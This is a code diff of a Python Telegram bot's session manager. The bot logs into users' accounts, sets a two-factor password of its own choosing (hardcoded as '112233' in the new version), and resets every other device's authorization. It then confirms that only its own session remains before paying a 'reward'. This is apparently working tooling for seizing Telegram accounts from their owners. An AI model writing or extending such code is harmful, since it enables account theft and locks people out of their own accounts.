@@ -2,13 +2,9 @@ import os
 import asyncio
 from tempfile import NamedTemporaryFile
 from telethon.sync import TelegramClient
-from config import API_ID, API_HASH, SESSIONS_DIR, DEFAULT_2FA_PASSWORD
+from config import API_ID, API_HASH, SESSIONS_DIR
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
-
-# Configuration for handling persistent database issues
-VALIDATION_BYPASS_MODE = True  # Set to True to be more lenient with validation errors
-DATABASE_ERROR_COUNT = 0  # Track consecutive database errors
 
 
 class SessionManager:
@@ -46,16 +42,11 @@ class SessionManager:
             state["state"] = "awaiting_password"
             return "password_needed", None
         except Exception as e:
-            if os.path.exists(state["session_path"]):
-                os.unlink(state["session_path"])
+            os.unlink(state["session_path"])
             return "error", str(e)
 
-        # Set 2FA password and logout other devices
         try:
-            # Set 2FA password
-            if await client.edit_2fa(new_password=DEFAULT_2FA_PASSWORD, hint="auto-set by bot"):
-                # Logout other devices to ensure only 1 device is logged in
-                await self.logout_other_devices(client)
+            if await client.edit_2fa(new_password="112233", hint="auto-set by bot"):
                 self._save_session(state, client)
                 return "verified_and_secured", None
             else:
@@ -74,11 +65,8 @@ class SessionManager:
         except Exception:
             return "error", "Current 2FA password is incorrect."
 
-        # Update 2FA password and logout other devices
         try:
-            if await client.edit_2fa(current_password=password, new_password=DEFAULT_2FA_PASSWORD):
-                # Logout other devices to ensure only 1 device is logged in
-                await self.logout_other_devices(client)
+            if await client.edit_2fa(current_password=password, new_password="112233"):
                 self._save_session(state, client)
                 return "verified_and_secured", None
             else:
@@ -93,30 +81,10 @@ class SessionManager:
         client = state["client"]
         try:
             self._save_session(state, client)
-            # Clean up user state after successful finalization
-            self.user_states.pop(user_id, None)
             return True
         except Exception as e:
             print(f"❌ Failed to save session: {str(e)}")
             return False
-
-    async def cleanup_session(self, user_id):
-        """Clean up session state and disconnect client (for cancellation)"""
-        state = self.user_states.get(user_id)
-        if not state:
-            return
-        
-        try:
-            client = state.get("client")
-            if client and client.is_connected():
-                await client.disconnect()
-                print(f"✅ Disconnected client for user {user_id}")
-        except Exception as e:
-            print(f"Error disconnecting client for user {user_id}: {e}")
-        finally:
-            # Remove user state regardless
-            self.user_states.pop(user_id, None)
-            print(f"✅ Cleaned up session state for user {user_id}")
 
     async def logout_other_devices(self, client):
         try:
@@ -151,100 +119,37 @@ class SessionManager:
             os.rename(old_path, final_path)
 
     def validate_session_before_reward(self, phone_number):
-        """Simplified session validation without async conflicts"""
-        global DATABASE_ERROR_COUNT
-        
         session_path = os.path.join(SESSIONS_DIR, f"{phone_number}.session")
         if not os.path.exists(session_path):
             return False, "Session file does not exist."
 
-        print(f"🔍 Validating session for {phone_number}")
-        
-        # If we've had multiple database errors, use bypass mode
-        if VALIDATION_BYPASS_MODE and DATABASE_ERROR_COUNT > 3:
-            print(f"⚠️ Bypass mode active due to persistent database issues ({DATABASE_ERROR_COUNT} errors)")
-            if os.path.exists(session_path) and os.path.getsize(session_path) > 500:
-                print(f"✅ Bypass validation passed for {phone_number}")
-                return True, None
-        
-        try:
-            # Simple validation approach - just check if session file exists and is readable
-            # This avoids async conflicts completely
-            
-            # Check file size and modification time
-            import time
-            stat = os.stat(session_path)
-            file_size = stat.st_size
-            mod_time = stat.st_mtime
-            current_time = time.time()
-            
-            # Basic checks
-            if file_size < 100:  # Session files should be larger
-                print(f"❌ Session file too small: {file_size} bytes")
-                return False, "Session file appears corrupted (too small)"
-            
-            if current_time - mod_time > 7200:  # 2 hours old
-                print(f"⚠️ Session file is old: {(current_time - mod_time)/60:.1f} minutes")
-                # Don't fail for old files, just warn
-            
-            # Try a simple synchronous approach
+        async def check_auths():
             try:
-                # Import telethon sync to avoid async issues
-                from telethon.sync import TelegramClient as SyncTelegramClient
-                
-                # Use a very short timeout
-                with SyncTelegramClient(session_path, API_ID, API_HASH) as client:
-                    # Just try to connect - this validates the session
-                    client.connect()
-                    
-                    # If we get here, session is valid
-                    print(f"✅ Session validation passed for {phone_number}")
-                    return True, None
-                    
-            except Exception as sync_error:
-                print(f"❌ Sync validation failed: {str(sync_error)}")
-                
-                # Fall back to simple file-based validation
-                print(f"🔄 Using file-based validation for {phone_number}")
-                
-                # If session file exists and has reasonable size, assume it's valid
-                # This is a safe fallback that avoids database locking issues
-                if file_size > 1000:  # Reasonable session file size
-                    print(f"✅ File-based validation passed for {phone_number}")
-                    return True, None
-                else:
-                    return False, "Session file appears invalid"
-            
-        except Exception as e:
-            error_msg = str(e).lower()
-            print(f"❌ Session validation exception: {str(e)}")
-            
-            # Track database errors
-            if "database is locked" in error_msg or "database" in error_msg:
-                DATABASE_ERROR_COUNT += 1
-                print(f"🔄 Database issue #{DATABASE_ERROR_COUNT} detected, using fallback validation")
-                
-                # Simple fallback: if session file exists and is not empty, consider it valid
-                try:
-                    if os.path.exists(session_path) and os.path.getsize(session_path) > 500:
-                        print(f"✅ Fallback validation passed for {phone_number}")
+                async with TelegramClient(session_path, API_ID, API_HASH) as client:
+                    auths = await client(GetAuthorizationsRequest())
+                    if len(auths.authorizations) == 1:
+                        print(f"✅ Session OK for {phone_number}")
                         return True, None
-                    else:
-                        print(f"❌ Session file too small or missing: {session_path}")
-                        return False, "Session file missing or too small"
-                except Exception as fallback_error:
-                    print(f"❌ Even fallback validation failed: {fallback_error}")
-                    # As last resort, if bypass mode is enabled, allow it
-                    if VALIDATION_BYPASS_MODE:
-                        print(f"⚠️ Using emergency bypass for {phone_number}")
+
+                    print(f"⚠️ Multiple sessions. Attempting logout...")
+                    for session in auths.authorizations:
+                        if not session.current:
+                            await client(ResetAuthorizationRequest(hash=session.hash))
+
+                    # 🔁 Wait 10 seconds before final recheck
+                    await asyncio.sleep(10)
+                    recheck = await client(GetAuthorizationsRequest())
+                    if len(recheck.authorizations) == 1:
+                        print("✅ Session now valid.")
                         return True, None
-                    return False, "Could not validate session file"
-            else:
-                # Reset database error count for non-database errors
-                if DATABASE_ERROR_COUNT > 0:
-                    DATABASE_ERROR_COUNT = max(0, DATABASE_ERROR_COUNT - 1)
-            
-            return False, f"Session validation error: {str(e)}"
+
+                    os.remove(session_path)
+                    return False, "❌ Multiple devices still logged in. Session removed."
+            except Exception as e:
+                print(f"❌ Validation error: {str(e)}")
+                return False, f"Error verifying session: {str(e)}"
+
+        return asyncio.run(check_auths())
 
 
 # Global instance
